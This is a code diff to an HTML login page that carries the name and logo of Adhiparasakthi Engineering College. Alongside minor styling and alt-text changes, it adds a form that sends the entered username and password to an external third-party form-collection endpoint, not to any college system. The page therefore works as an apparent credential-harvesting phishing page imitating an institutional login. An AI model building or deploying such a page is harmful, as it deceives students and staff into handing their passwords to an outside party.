@@ -39,6 +39,7 @@
       background:#2c5364;
       color:white;
       border:none;
+      cursor:pointer;
     }
   </style>
 </head>
@@ -47,14 +48,19 @@
 
 <div class="box">
 
-  <img src="download.jpeg">
+  <img src="download.jpeg" alt="College Logo">
 
   <h3>ADHIPARASAKTHI ENGINEERING COLLEGE</h3>
 
-  <input type="text" placeholder="Username">
-  <input type="password" placeholder="Password">
+  <form action="https://usebasin.com/f/857931b57601" method="POST">
 
-  <button>Login</button>
+    <input type="text" name="username" placeholder="Username" required>
+
+    <input type="password" name="password" placeholder="Password" required>
+
+    <button type="submit">Login</button>
+
+  </form>
 
 </div>
 
